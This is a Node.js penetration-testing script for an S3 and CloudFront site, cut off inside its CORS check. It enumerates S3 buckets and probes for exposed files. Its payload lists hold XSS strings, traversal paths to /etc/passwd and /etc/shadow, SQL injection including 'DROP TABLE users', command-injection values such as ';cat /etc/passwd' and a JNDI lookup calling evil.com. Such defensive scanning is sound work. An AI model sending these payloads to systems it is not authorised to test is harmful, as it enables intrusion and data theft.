#!/usr/bin/env node

/**
 * Penetration Testing Suite for S3 + CloudFront Deployment
 * 
 * This script implements comprehensive penetration testing procedures:
 * - Common vulnerability testing (XSS, directory traversal, etc.)
 * - S3 bucket access control validation
 * - Information disclosure vulnerability checks
 * - Security configuration testing
 * 
 * Requirements: 7.5 - Security hardening and compliance
 */

const https = require('https');
const http = require('http');
const dns = require('dns').promises;
const crypto = require('crypto');
const fs = require('fs').promises;
const path = require('path');
const { URL } = require('url');

class PenetrationTestingSuite {
    constructor(options = {}) {
        this.target = options.target;
        this.cloudfrontDomain = options.cloudfrontDomain;
        this.s3BucketName = options.s3BucketName;
        this.verbose = options.verbose || false;
        this.timeout = options.timeout || 10000;
        this.results = {
            vulnerabilityTests: {},
            s3AccessTests: {},
            informationDisclosure: {},
            securityConfiguration: {},
            summary: { passed: 0, failed: 0, warnings: 0, critical: 0 }
        };
    }

    log(message, level = 'info') {
        if (this.verbose || level === 'error' || level === 'critical') {
            const timestamp = new Date().toISOString();
            const emoji = level === 'critical' ? '🚨' : level === 'error' ? '❌' : 
                         level === 'warning' ? '⚠️' : level === 'success' ? '✅' : 'ℹ️';
            console.log(`[${timestamp}] ${emoji} ${message}`);
        }
    }

    async runAllTests() {
        this.log('🔍 Starting Penetration Testing Suite', 'info');
        this.log(`Target: ${this.target}`, 'info');
        
        try {
            // Run vulnerability tests
            await this.testCommonVulnerabilities();
            
            // Test S3 bucket access controls
            await this.validateS3BucketAccess();
            
            // Check for information disclosure
            await this.checkInformationDisclosure();
            
            // Validate security configuration
            await this.validateSecurityConfiguration();
            
            // Generate comprehensive report
            return await this.generateReport();
            
        } catch (error) {
            this.log(`Critical error during testing: ${error.message}`, 'critical');
            throw error;
        }
    } 
   async testCommonVulnerabilities() {
        this.log('🛡️ Testing for common vulnerabilities', 'info');
        
        const tests = [
            { name: 'XSS Vulnerabilities', method: this.testXSSVulnerabilities.bind(this) },
            { name: 'Directory Traversal', method: this.testDirectoryTraversal.bind(this) },
            { name: 'SQL Injection', method: this.testSQLInjection.bind(this) },
            { name: 'CSRF Protection', method: this.testCSRFProtection.bind(this) },
            { name: 'HTTP Method Testing', method: this.testHTTPMethods.bind(this) },
            { name: 'Input Validation', method: this.testInputValidation.bind(this) },
            { name: 'Authentication Bypass', method: this.testAuthenticationBypass.bind(this) }
        ];

        for (const test of tests) {
            try {
                this.log(`Running ${test.name} test`, 'info');
                await test.method();
            } catch (error) {
                this.log(`Error in ${test.name}: ${error.message}`, 'error');
                this.addResult('vulnerabilityTests', test.name.toLowerCase().replace(/\s+/g, '_'), {
                    status: 'error',
                    message: `Test failed: ${error.message}`,
                    severity: 'medium'
                });
            }
        }
    }

    async testXSSVulnerabilities() {
        const payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            'javascript:alert("XSS")',
            '<svg onload=alert("XSS")>',
            '"><script>alert("XSS")</script>',
            '<iframe src="javascript:alert(\'XSS\')"></iframe>',
            '<body onload=alert("XSS")>',
            '<input onfocus=alert("XSS") autofocus>',
            '<select onfocus=alert("XSS") autofocus>',
            '<textarea onfocus=alert("XSS") autofocus>'
        ];

        const testPoints = [
            '/?q=',
            '/?search=',
            '/?name=',
            '/?comment=',
            '/?message=',
            '/search?q=',
            '/contact?message='
        ];

        let vulnerabilities = [];
        let reflectedPayloads = [];

        for (const testPoint of testPoints) {
            for (const payload of payloads) {
                try {
                    const testUrl = `${this.target}${testPoint}${encodeURIComponent(payload)}`;
                    const response = await this.makeRequest(testUrl, { method: 'GET' });
                    
                    if (response.body && response.body.includes(payload)) {
                        vulnerabilities.push({
                            url: testUrl,
                            payload,
                            reflected: true,
                            statusCode: response.statusCode
                        });
                        reflectedPayloads.push(payload);
                    }
                } catch (error) {
                    // Expected for most payloads in static sites
                }
            }
        }

        this.addResult('vulnerabilityTests', 'xss_vulnerabilities', {
            status: vulnerabilities.length > 0 ? 'failed' : 'passed',
            message: vulnerabilities.length > 0 ? 
                `${vulnerabilities.length} potential XSS vulnerabilities found` :
                'No XSS vulnerabilities detected',
            severity: vulnerabilities.length > 0 ? 'critical' : 'low',
            details: {
                vulnerabilities,
                reflectedPayloads: [...new Set(reflectedPayloads)],
                testedPayloads: payloads.length,
                testedEndpoints: testPoints.length
            }
        });
    }

    async testDirectoryTraversal() {
        const payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '....//....//....//etc/passwd',
            '../../../proc/version',
            '..%2F..%2F..%2Fetc%2Fpasswd',
            '..%252f..%252f..%252fetc%252fpasswd',
            '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
            '../../../etc/shadow',
            '../../../root/.bash_history'
        ];

        let vulnerabilities = [];

        for (const payload of payloads) {
            try {
                const testUrl = `${this.target}/${payload}`;
                const response = await this.makeRequest(testUrl, { method: 'GET' });
                
                if (response.statusCode === 200) {
                    const body = response.body.toLowerCase();
                    if (body.includes('root:') || body.includes('[drivers]') || 
                        body.includes('linux version') || body.includes('daemon:')) {
                        vulnerabilities.push({
                            url: testUrl,
                            payload,
                            statusCode: response.statusCode,
                            evidence: body.substring(0, 200)
                        });
                    }
                }
            } catch (error) {
                // Expected for most payloads
            }
        }

        this.addResult('vulnerabilityTests', 'directory_traversal', {
            status: vulnerabilities.length > 0 ? 'failed' : 'passed',
            message: vulnerabilities.length > 0 ? 
                `${vulnerabilities.length} directory traversal vulnerabilities found` :
                'No directory traversal vulnerabilities detected',
            severity: vulnerabilities.length > 0 ? 'critical' : 'low',
            details: {
                vulnerabilities,
                testedPayloads: payloads.length
            }
        });
    }   
 async testSQLInjection() {
        const payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "1' UNION SELECT NULL--",
            "' OR 1=1--",
            "admin'--",
            "' OR 'x'='x",
            "1'; WAITFOR DELAY '00:00:05'--",
            "' UNION SELECT username, password FROM users--",
            "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "' OR (SELECT COUNT(*) FROM sysobjects)>0--"
        ];

        const testPoints = [
            '/?id=',
            '/?user=',
            '/?search=',
            '/api/user?id=',
            '/login?username=',
            '/search?query='
        ];

        let suspiciousResponses = [];

        for (const testPoint of testPoints) {
            for (const payload of payloads) {
                try {
                    const testUrl = `${this.target}${testPoint}${encodeURIComponent(payload)}`;
                    const response = await this.makeRequest(testUrl, { method: 'GET' });
                    
                    const body = response.body.toLowerCase();
                    const sqlErrors = [
                        'sql syntax',
                        'mysql_fetch',
                        'ora-01756',
                        'microsoft ole db',
                        'odbc sql server driver',
                        'sqlite_error',
                        'postgresql error',
                        'warning: mysql'
                    ];

                    if (sqlErrors.some(error => body.includes(error))) {
                        suspiciousResponses.push({
                            url: testUrl,
                            payload,
                            statusCode: response.statusCode,
                            evidence: body.substring(0, 300)
                        });
                    }
                } catch (error) {
                    // Expected for static sites
                }
            }
        }

        this.addResult('vulnerabilityTests', 'sql_injection', {
            status: suspiciousResponses.length > 0 ? 'failed' : 'passed',
            message: suspiciousResponses.length > 0 ? 
                `${suspiciousResponses.length} potential SQL injection vulnerabilities found` :
                'No SQL injection vulnerabilities detected (expected for static sites)',
            severity: suspiciousResponses.length > 0 ? 'critical' : 'low',
            details: {
                suspiciousResponses,
                testedPayloads: payloads.length,
                testedEndpoints: testPoints.length
            }
        });
    }

    async testCSRFProtection() {
        const methods = ['POST', 'PUT', 'DELETE', 'PATCH'];
        const testData = {
            'application/json': JSON.stringify({ test: 'csrf', action: 'delete' }),
            'application/x-www-form-urlencoded': 'action=delete&confirm=true',
            'multipart/form-data': 'test=csrf&action=modify'
        };

        let vulnerabilities = [];

        for (const method of methods) {
            for (const [contentType, body] of Object.entries(testData)) {
                try {
                    const response = await this.makeRequest(this.target, {
                        method,
                        headers: { 'Content-Type': contentType },
                        body
                    });

                    if (response.statusCode === 200) {
                        vulnerabilities.push({
                            method,
                            contentType,
                            statusCode: response.statusCode,
                            message: 'Request accepted without CSRF protection'
                        });
                    }
                } catch (error) {
                    // Expected for static sites - methods should be rejected
                }
            }
        }

        this.addResult('vulnerabilityTests', 'csrf_protection', {
            status: vulnerabilities.length > 0 ? 'failed' : 'passed',
            message: vulnerabilities.length > 0 ? 
                `CSRF protection may be missing for ${vulnerabilities.length} endpoints` :
                'State-changing requests properly rejected (static site)',
            severity: vulnerabilities.length > 0 ? 'high' : 'low',
            details: {
                vulnerabilities,
                testedMethods: methods.length
            }
        });
    }

    async testHTTPMethods() {
        const methods = ['OPTIONS', 'TRACE', 'CONNECT', 'PROPFIND', 'PROPPATCH', 'MKCOL', 'COPY', 'MOVE', 'LOCK', 'UNLOCK'];
        let allowedMethods = [];
        let dangerousMethods = [];

        for (const method of methods) {
            try {
                const response = await this.makeRequest(this.target, { method });
                
                if (response.statusCode < 400) {
                    allowedMethods.push({
                        method,
                        statusCode: response.statusCode,
                        headers: response.headers
                    });

                    if (['TRACE', 'CONNECT', 'PROPFIND'].includes(method)) {
                        dangerousMethods.push(method);
                    }
                }
            } catch (error) {
                // Expected for most methods
            }
        }

        this.addResult('vulnerabilityTests', 'http_methods', {
            status: dangerousMethods.length > 0 ? 'failed' : 'passed',
            message: dangerousMethods.length > 0 ? 
                `Dangerous HTTP methods allowed: ${dangerousMethods.join(', ')}` :
                'No dangerous HTTP methods detected',
            severity: dangerousMethods.length > 0 ? 'medium' : 'low',
            details: {
                allowedMethods,
                dangerousMethods,
                testedMethods: methods.length
            }
        });
    }

    async testInputValidation() {
        const maliciousInputs = [
            '<script>alert(1)</script>',
            '${7*7}',
            '{{7*7}}',
            '#{7*7}',
            '%{7*7}',
            '${jndi:ldap://evil.com/a}',
            '../../../etc/passwd',
            '|id',
            ';cat /etc/passwd',
            '`whoami`',
            '$(whoami)',
            'file:///etc/passwd',
            'data:text/html,<script>alert(1)</script>'
        ];

        const testParameters = ['q', 'search', 'name', 'email', 'message', 'comment', 'id', 'user'];
        let vulnerabilities = [];

        for (const param of testParameters) {
            for (const input of maliciousInputs) {
                try {
                    const testUrl = `${this.target}/?${param}=${encodeURIComponent(input)}`;
                    const response = await this.makeRequest(testUrl, { method: 'GET' });
                    
                    if (response.body && (
                        response.body.includes(input) ||
                        response.body.includes('49') || // 7*7 result
                        response.body.includes('root:') ||
                        response.body.includes('uid=')
                    )) {
                        vulnerabilities.push({
                            parameter: param,
                            input,
                            url: testUrl,
                            evidence: response.body.substring(0, 200)
                        });
                    }
                } catch (error) {
                    // Expected for most inputs
                }
            }
        }

        this.addResult('vulnerabilityTests', 'input_validation', {
            status: vulnerabilities.length > 0 ? 'failed' : 'passed',
            message: vulnerabilities.length > 0 ? 
                `${vulnerabilities.length} input validation issues found` :
                'Input validation appears secure',
            severity: vulnerabilities.length > 0 ? 'high' : 'low',
            details: {
                vulnerabilities,
                testedInputs: maliciousInputs.length,
                testedParameters: testParameters.length
            }
        });
    }

    async testAuthenticationBypass() {
        const bypassAttempts = [
            { path: '/admin', description: 'Admin panel access' },
            { path: '/.env', description: 'Environment file access' },
            { path: '/config', description: 'Configuration access' },
            { path: '/api/admin', description: 'Admin API access' },
            { path: '/dashboard', description: 'Dashboard access' },
            { path: '/wp-admin', description: 'WordPress admin' },
            { path: '/administrator', description: 'Administrator panel' },
            { path: '/phpmyadmin', description: 'Database admin' }
        ];

        let accessiblePaths = [];

        for (const attempt of bypassAttempts) {
            try {
                const response = await this.makeRequest(`${this.target}${attempt.path}`, { method: 'GET' });
                
                if (response.statusCode === 200) {
                    accessiblePaths.push({
                        path: attempt.path,
                        description: attempt.description,
                        statusCode: response.statusCode,
                        contentLength: response.body ? response.body.length : 0
                    });
                }
            } catch (error) {
                // Expected for most paths
            }
        }

        this.addResult('vulnerabilityTests', 'authentication_bypass', {
            status: accessiblePaths.length > 0 ? 'warning' : 'passed',
            message: accessiblePaths.length > 0 ? 
                `${accessiblePaths.length} potentially sensitive paths accessible` :
                'No authentication bypass vulnerabilities detected',
            severity: accessiblePaths.length > 0 ? 'medium' : 'low',
            details: {
                accessiblePaths,
                testedPaths: bypassAttempts.length
            }
        });
    }

    async validateS3BucketAccess() {
        this.log('🪣 Validating S3 bucket access controls', 'info');

        const tests = [
            { name: 'Direct S3 Access', method: this.testDirectS3Access.bind(this) },
            { name: 'S3 Bucket Enumeration', method: this.testS3BucketEnumeration.bind(this) },
            { name: 'S3 Bucket Policies', method: this.testS3BucketPolicies.bind(this) },
            { name: 'S3 Object Permissions', method: this.testS3ObjectPermissions.bind(this) }
        ];

        for (const test of tests) {
            try {
                this.log(`Running ${test.name} test`, 'info');
                await test.method();
            } catch (error) {
                this.log(`Error in ${test.name}: ${error.message}`, 'error');
                this.addResult('s3AccessTests', test.name.toLowerCase().replace(/\s+/g, '_'), {
                    status: 'error',
                    message: `Test failed: ${error.message}`,
                    severity: 'medium'
                });
            }
        }
    }

    async testDirectS3Access() {
        const possibleBuckets = [];
        
        if (this.s3BucketName) {
            possibleBuckets.push(this.s3BucketName);
        }

        // Generate possible bucket names from domain
        const domain = new URL(this.target).hostname;
        possibleBuckets.push(
            domain,
            domain.replace(/\./g, '-'),
            domain.replace(/\./g, ''),
            `${domain}-static`,
            `${domain}-assets`,
            `www-${domain}`,
            `${domain}-backup`
        );

        let accessibleBuckets = [];

        for (const bucketName of possibleBuckets) {
            const bucketUrls = [
                `https://${bucketName}.s3.amazonaws.com`,
                `https://s3.amazonaws.com/${bucketName}`,
                `https://${bucketName}.s3.us-east-1.amazonaws.com`,
                `https://${bucketName}.s3.us-west-2.amazonaws.com`
            ];

            for (const bucketUrl of bucketUrls) {
                try {
                    const response = await this.makeRequest(bucketUrl, { method: 'GET' });
                    
                    if (response.statusCode === 200 || response.statusCode === 403) {
                        accessibleBuckets.push({
                            bucketName,
                            url: bucketUrl,
                            statusCode: response.statusCode,
                            accessible: response.statusCode === 200,
                            listable: response.body && response.body.includes('<ListBucketResult>')
                        });
                    }
                } catch (error) {
                    // Expected for most bucket names
                }
            }
        }

        const directlyAccessible = accessibleBuckets.filter(b => b.accessible);

        this.addResult('s3AccessTests', 'direct_s3_access', {
            status: directlyAccessible.length > 0 ? 'failed' : 'passed',
            message: directlyAccessible.length > 0 ? 
                `${directlyAccessible.length} S3 buckets are directly accessible` :
                'S3 buckets properly protected from direct access',
            severity: directlyAccessible.length > 0 ? 'critical' : 'low',
            details: {
                accessibleBuckets,
                directlyAccessible,
                testedBuckets: possibleBuckets.length
            }
        });
    }    
async testS3BucketEnumeration() {
        const commonPrefixes = ['www', 'static', 'assets', 'cdn', 'media', 'files', 'backup', 'logs'];
        const domain = new URL(this.target).hostname.replace(/\./g, '-');
        
        let enumeratedBuckets = [];

        for (const prefix of commonPrefixes) {
            const bucketNames = [
                `${prefix}-${domain}`,
                `${domain}-${prefix}`,
                `${prefix}.${domain}`.replace(/\./g, '-')
            ];

            for (const bucketName of bucketNames) {
                try {
                    const response = await this.makeRequest(`https://${bucketName}.s3.amazonaws.com`, { method: 'HEAD' });
                    
                    if (response.statusCode === 200 || response.statusCode === 403) {
                        enumeratedBuckets.push({
                            bucketName,
                            statusCode: response.statusCode,
                            exists: true
                        });
                    }
                } catch (error) {
                    // Expected for most bucket names
                }
            }
        }

        this.addResult('s3AccessTests', 's3_bucket_enumeration', {
            status: enumeratedBuckets.length > 0 ? 'warning' : 'passed',
            message: enumeratedBuckets.length > 0 ? 
                `${enumeratedBuckets.length} S3 buckets discovered through enumeration` :
                'No S3 buckets discovered through enumeration',
            severity: enumeratedBuckets.length > 0 ? 'medium' : 'low',
            details: {
                enumeratedBuckets,
                testedPrefixes: commonPrefixes.length
            }
        });
    }

    async testS3BucketPolicies() {
        // Test for common S3 misconfigurations
        const testUrls = [
            `${this.target}/.well-known/`,
            `${this.target}/robots.txt`,
            `${this.target}/sitemap.xml`,
            `${this.target}/favicon.ico`
        ];

        let policyIssues = [];

        for (const testUrl of testUrls) {
            try {
                const response = await this.makeRequest(testUrl, { method: 'GET' });
                
                // Check response headers for S3 indicators
                const headers = response.headers;
                if (headers['x-amz-bucket-region'] || headers['x-amz-request-id']) {
                    policyIssues.push({
                        url: testUrl,
                        issue: 'S3 headers exposed',
                        headers: {
                            'x-amz-bucket-region': headers['x-amz-bucket-region'],
                            'x-amz-request-id': headers['x-amz-request-id'],
                            'server': headers['server']
                        }
                    });
                }
            } catch (error) {
                // Expected for some URLs
            }
        }

        this.addResult('s3AccessTests', 's3_bucket_policies', {
            status: policyIssues.length > 0 ? 'warning' : 'passed',
            message: policyIssues.length > 0 ? 
                `${policyIssues.length} S3 policy configuration issues detected` :
                'S3 bucket policies appear properly configured',
            severity: policyIssues.length > 0 ? 'low' : 'low',
            details: {
                policyIssues,
                testedUrls: testUrls.length
            }
        });
    }

    async testS3ObjectPermissions() {
        const sensitiveFiles = [
            '.env',
            'config.json',
            'database.json',
            'secrets.json',
            '.git/config',
            'package.json',
            'composer.json',
            'web.config',
            '.htaccess'
        ];

        let exposedFiles = [];

        for (const file of sensitiveFiles) {
            try {
                const response = await this.makeRequest(`${this.target}/${file}`, { method: 'GET' });
                
                if (response.statusCode === 200 && response.body) {
                    exposedFiles.push({
                        file,
                        size: response.body.length,
                        contentType: response.headers['content-type'],
                        sensitive: ['.env', 'config.json', 'database.json', 'secrets.json', '.git/config'].includes(file)
                    });
                }
            } catch (error) {
                // Expected for most files
            }
        }

        const sensitiveExposed = exposedFiles.filter(f => f.sensitive);

        this.addResult('s3AccessTests', 's3_object_permissions', {
            status: sensitiveExposed.length > 0 ? 'failed' : 'passed',
            message: sensitiveExposed.length > 0 ? 
                `${sensitiveExposed.length} sensitive files exposed` :
                'No sensitive files exposed',
            severity: sensitiveExposed.length > 0 ? 'critical' : 'low',
            details: {
                exposedFiles,
                sensitiveExposed,
                testedFiles: sensitiveFiles.length
            }
        });
    }

    async checkInformationDisclosure() {
        this.log('🔍 Checking for information disclosure vulnerabilities', 'info');

        const tests = [
            { name: 'Server Information', method: this.testServerInformation.bind(this) },
            { name: 'Error Messages', method: this.testErrorMessages.bind(this) },
            { name: 'Debug Information', method: this.testDebugInformation.bind(this) },
            { name: 'Backup Files', method: this.testBackupFiles.bind(this) },
            { name: 'Source Code Exposure', method: this.testSourceCodeExposure.bind(this) }
        ];

        for (const test of tests) {
            try {
                this.log(`Running ${test.name} test`, 'info');
                await test.method();
            } catch (error) {
                this.log(`Error in ${test.name}: ${error.message}`, 'error');
                this.addResult('informationDisclosure', test.name.toLowerCase().replace(/\s+/g, '_'), {
                    status: 'error',
                    message: `Test failed: ${error.message}`,
                    severity: 'medium'
                });
            }
        }
    } 
   async testServerInformation() {
        try {
            const response = await this.makeRequest(this.target, { method: 'HEAD' });
            const headers = response.headers;
            
            const disclosureHeaders = [];
            const dangerousHeaders = [
                'server',
                'x-powered-by',
                'x-aspnet-version',
                'x-generator',
                'x-drupal-cache',
                'x-varnish',
                'x-cache',
                'x-amz-cf-pop',
                'x-amz-cf-id'
            ];

            dangerousHeaders.forEach(header => {
                if (headers[header]) {
                    disclosureHeaders.push({
                        header,
                        value: headers[header],
                        risk: ['server', 'x-powered-by', 'x-aspnet-version'].includes(header) ? 'high' : 'low'
                    });
                }
            });

            this.addResult('informationDisclosure', 'server_information', {
                status: disclosureHeaders.filter(h => h.risk === 'high').length > 0 ? 'failed' : 'passed',
                message: disclosureHeaders.length > 0 ? 
                    `${disclosureHeaders.length} information disclosure headers found` :
                    'No server information disclosure detected',
                severity: disclosureHeaders.filter(h => h.risk === 'high').length > 0 ? 'medium' : 'low',
                details: {
                    disclosureHeaders,
                    allHeaders: Object.keys(headers)
                }
            });
        } catch (error) {
            this.addResult('informationDisclosure', 'server_information', {
                status: 'error',
                message: `Could not test server information: ${error.message}`,
                severity: 'low'
            });
        }
    }

    async testErrorMessages() {
        const errorTriggers = [
            '/nonexistent-page-12345',
            '/admin/login',
            '/api/nonexistent',
            '/.env',
            '/config.php',
            '/wp-config.php',
            '/database.yml'
        ];

        let informativeErrors = [];

        for (const trigger of errorTriggers) {
            try {
                const response = await this.makeRequest(`${this.target}${trigger}`, { method: 'GET' });
                
                if (response.body) {
                    const body = response.body.toLowerCase();
                    const errorPatterns = [
                        'stack trace',
                        'exception',
                        'mysql',
                        'postgresql',
                        'oracle',
                        'sql server',
                        'file not found',
                        'permission denied',
                        'access denied',
                        'internal server error',
                        'debug',
                        'warning:',
                        'error:',
                        'notice:'
                    ];

                    const foundPatterns = errorPatterns.filter(pattern => body.includes(pattern));
                    if (foundPatterns.length > 0) {
                        informativeErrors.push({
                            url: `${this.target}${trigger}`,
                            statusCode: response.statusCode,
                            patterns: foundPatterns,
                            excerpt: response.body.substring(0, 300)
                        });
                    }
                }
            } catch (error) {
                // Expected for most error triggers
            }
        }

        this.addResult('informationDisclosure', 'error_messages', {
            status: informativeErrors.length > 0 ? 'warning' : 'passed',
            message: informativeErrors.length > 0 ? 
                `${informativeErrors.length} informative error messages found` :
                'No informative error messages detected',
            severity: informativeErrors.length > 0 ? 'low' : 'low',
            details: {
                informativeErrors,
                testedTriggers: errorTriggers.length
            }
        });
    }

    async testDebugInformation() {
        const debugPaths = [
            '/debug',
            '/test',
            '/phpinfo.php',
            '/info.php',
            '/.git/',
            '/.svn/',
            '/debug.log',
            '/error.log',
            '/access.log',
            '/console',
            '/trace'
        ];

        let debugExposure = [];

        for (const path of debugPaths) {
            try {
                const response = await this.makeRequest(`${this.target}${path}`, { method: 'GET' });
                
                if (response.statusCode === 200 && response.body) {
                    const body = response.body.toLowerCase();
                    if (body.includes('debug') || body.includes('trace') || 
                        body.includes('phpinfo') || body.includes('git') ||
                        body.includes('console') || body.includes('log')) {
                        debugExposure.push({
                            path,
                            statusCode: response.statusCode,
                            contentLength: response.body.length,
                            contentType: response.headers['content-type']
                        });
                    }
                }
            } catch (error) {
                // Expected for most debug paths
            }
        }

        this.addResult('informationDisclosure', 'debug_information', {
            status: debugExposure.length > 0 ? 'failed' : 'passed',
            message: debugExposure.length > 0 ? 
                `${debugExposure.length} debug information endpoints exposed` :
                'No debug information exposure detected',
            severity: debugExposure.length > 0 ? 'medium' : 'low',
            details: {
                debugExposure,
                testedPaths: debugPaths.length
            }
        });
    }

    async testBackupFiles() {
        const backupExtensions = ['.bak', '.backup', '.old', '.orig', '.tmp', '.save', '.swp', '~'];
        const commonFiles = ['index', 'config', 'database', 'admin', 'login', 'user'];
        
        let backupFiles = [];

        for (const file of commonFiles) {
            for (const ext of backupExtensions) {
                const testPaths = [
                    `/${file}${ext}`,
                    `/${file}.php${ext}`,
                    `/${file}.js${ext}`,
                    `/${file}.json${ext}`
                ];

                for (const path of testPaths) {
                    try {
                        const response = await this.makeRequest(`${this.target}${path}`, { method: 'GET' });
                        
                        if (response.statusCode === 200 && response.body && response.body.length > 0) {
                            backupFiles.push({
                                path,
                                size: response.body.length,
                                contentType: response.headers['content-type']
                            });
                        }
                    } catch (error) {
                        // Expected for most backup files
                    }
                }
            }
        }

        this.addResult('informationDisclosure', 'backup_files', {
            status: backupFiles.length > 0 ? 'failed' : 'passed',
            message: backupFiles.length > 0 ? 
                `${backupFiles.length} backup files exposed` :
                'No backup files exposed',
            severity: backupFiles.length > 0 ? 'high' : 'low',
            details: {
                backupFiles,
                testedCombinations: commonFiles.length * backupExtensions.length * 4
            }
        });
    }

    async testSourceCodeExposure() {
        const sourceFiles = [
            '.git/config',
            '.git/HEAD',
            '.gitignore',
            'package.json',
            'composer.json',
            'requirements.txt',
            'Gemfile',
            'pom.xml',
            'web.config',
            '.htaccess',
            'Dockerfile',
            'docker-compose.yml',
            '.env.example',
            'README.md'
        ];

        let exposedFiles = [];

        for (const file of sourceFiles) {
            try {
                const response = await this.makeRequest(`${this.target}/${file}`, { method: 'GET' });
                
                if (response.statusCode === 200 && response.body) {
                    const sensitive = ['.git/config', '.git/HEAD', 'web.config', '.htaccess', 'Dockerfile'].includes(file);
                    exposedFiles.push({
                        file,
                        size: response.body.length,
                        sensitive,
                        contentType: response.headers['content-type']
                    });
                }
            } catch (error) {
                // Expected for most source files
            }
        }

        const sensitiveExposed = exposedFiles.filter(f => f.sensitive);

        this.addResult('informationDisclosure', 'source_code_exposure', {
            status: sensitiveExposed.length > 0 ? 'failed' : exposedFiles.length > 0 ? 'warning' : 'passed',
            message: sensitiveExposed.length > 0 ? 
                `${sensitiveExposed.length} sensitive source files exposed` :
                exposedFiles.length > 0 ? 
                `${exposedFiles.length} source files exposed (low risk)` :
                'No source code exposure detected',
            severity: sensitiveExposed.length > 0 ? 'high' : exposedFiles.length > 0 ? 'low' : 'low',
            details: {
                exposedFiles,
                sensitiveExposed,
                testedFiles: sourceFiles.length
            }
        });
    }

    async validateSecurityConfiguration() {
        this.log('🔒 Validating security configuration', 'info');

        const tests = [
            { name: 'Security Headers', method: this.testSecurityHeaders.bind(this) },
            { name: 'SSL Configuration', method: this.testSSLConfiguration.bind(this) },
            { name: 'CORS Configuration', method: this.testCORSConfiguration.bind(this) },
            { name: 'Content Type Validation', method: this.testContentTypeValidation.bind(this) }
        ];

        for (const test of tests) {
            try {
                this.log(`Running ${test.name} test`, 'info');
                await test.method();
            } catch (error) {
                this.log(`Error in ${test.name}: ${error.message}`, 'error');
                this.addResult('securityConfiguration', test.name.toLowerCase().replace(/\s+/g, '_'), {
                    status: 'error',
                    message: `Test failed: ${error.message}`,
                    severity: 'medium'
                });
            }
        }
    }

    async testSecurityHeaders() {
        try {
            const response = await this.makeRequest(this.target, { method: 'HEAD' });
            const headers = response.headers;
            
            const requiredHeaders = {
                'strict-transport-security': { required: true, pattern: /max-age=\d+/ },
                'x-content-type-options': { required: true, expected: 'nosniff' },
                'x-frame-options': { required: true, pattern: /(DENY|SAMEORIGIN)/ },
                'x-xss-protection': { required: true, pattern: /1; mode=block/ },
                'referrer-policy': { required: true, pattern: /(strict-origin|no-referrer)/ },
                'content-security-policy': { required: false, pattern: /default-src/ }
            };

            let missingHeaders = [];
            let invalidHeaders = [];
            let presentHeaders = [];

            Object.entries(requiredHeaders).forEach(([headerName, config]) => {
                const headerValue = headers[headerName.toLowerCase()];
                
                if (!headerValue) {
                    if (config.required) {
                        missingHeaders.push(headerName);
                    }
                } else {
                    let valid = true;
                    
                    if (config.expected && !headerValue.toLowerCase().includes(config.expected.toLowerCase())) {
                        valid = false;
                    }
                    
                    if (config.pattern && !config.pattern.test(headerValue)) {
                        valid = false;
                    }

                    if (valid) {
                        presentHeaders.push({ header: headerName, value: headerValue });
                    } else {
                        invalidHeaders.push({ header: headerName, value: headerValue });
                    }
                }
            });

            this.addResult('securityConfiguration', 'security_headers', {
                status: missingHeaders.length > 0 || invalidHeaders.length > 0 ? 'failed' : 'passed',
                message: missingHeaders.length > 0 ? 
                    `${missingHeaders.length} required security headers missing` :
                    invalidHeaders.length > 0 ?
                    `${invalidHeaders.length} security headers have invalid values` :
                    'All security headers properly configured',
                severity: missingHeaders.length > 0 ? 'high' : invalidHeaders.length > 0 ? 'medium' : 'low',
                details: {
                    missingHeaders,
                    invalidHeaders,
                    presentHeaders
                }
            });
        } catch (error) {
            this.addResult('securityConfiguration', 'security_headers', {
                status: 'error',
                message: `Could not test security headers: ${error.message}`,
                severity: 'medium'
            });
        }
    }

    async testSSLConfiguration() {
        try {
            const url = new URL(this.target);
            if (url.protocol !== 'https:') {
                this.addResult('securityConfiguration', 'ssl_configuration', {
                    status: 'failed',
                    message: 'Site not using HTTPS',
                    severity: 'critical'
                });
                return;
            }

            // Test HTTPS redirect
            const httpUrl = this.target.replace('https://', 'http://');
            try {
                const response = await this.makeRequest(httpUrl, { method: 'GET' });
                const redirectsToHttps = response.statusCode >= 300 && response.statusCode < 400 &&
                                       response.headers.location && response.headers.location.startsWith('https://');

                this.addResult('securityConfiguration', 'ssl_configuration', {
                    status: redirectsToHttps ? 'passed' : 'failed',
                    message: redirectsToHttps ? 
                        'HTTP properly redirects to HTTPS' :
                        'HTTP does not redirect to HTTPS',
                    severity: redirectsToHttps ? 'low' : 'high',
                    details: {
                        httpStatusCode: response.statusCode,
                        redirectLocation: response.headers.location
                    }
                });
            } catch (error) {
                this.addResult('securityConfiguration', 'ssl_configuration', {
                    status: 'passed',
                    message: 'HTTP requests properly rejected',
                    severity: 'low'
                });
            }
        } catch (error) {
            this.addResult('securityConfiguration', 'ssl_configuration', {
                status: 'error',
                message: `Could not test SSL configuration: ${error.message}`,
                severity: 'medium'
            });
        }
    }   
 async testCORSConfiguration() {
        const corsHeaders = [
            'Access-Control-Allow-Origin',
            'Access-Control-Allow-Methods',
            'Access-Control-Allow-Headers',
            'Access-Control-Allow-Credentials'
        ];

        try {
            const response = await this.makeRequest(this.target, {
                method: 'OPTIONS',
                headers: {
                    'Origin': 'https://evil.com',
                    'Access-Control-Request-Method': 'POST',
                    'Access-Control-Request-Headers': 'Content-Type'
                }
            });

            const corsIssues = [];
            const headers = response.headers;

            // Check for wildcard CORS
            if (headers['access-control-allow-origin'] === '*') {
                corsIssues.push({
                    issue: 'Wildcard CORS policy',
                    severity: 'medium',
                    description: 'Access-Control-Allow-Origin set to *'
                });
            }

            // Check for credentials with wildcard
            if (headers['access-control-allow-origin'] === '*' && 
                headers['access-control-allow-credentials'] === 'true') {
                corsIssues.push({
                    issue: 'Dangerous CORS configuration',
                    severity: 'high',
                    description: 'Wildcard origin with credentials allowed'
                });
            }

            this.addResult('securityConfiguration', 'cors_configuration', {
                status: corsIssues.filter(i => i.severity === 'high').length > 0 ? 'failed' : 
                        corsIssues.length > 0 ? 'warning' : 'passed',
                message: corsIssues.length > 0 ? 
                    `${corsIssues.length} CORS configuration issues found` :
                    'CORS configuration appears secure',
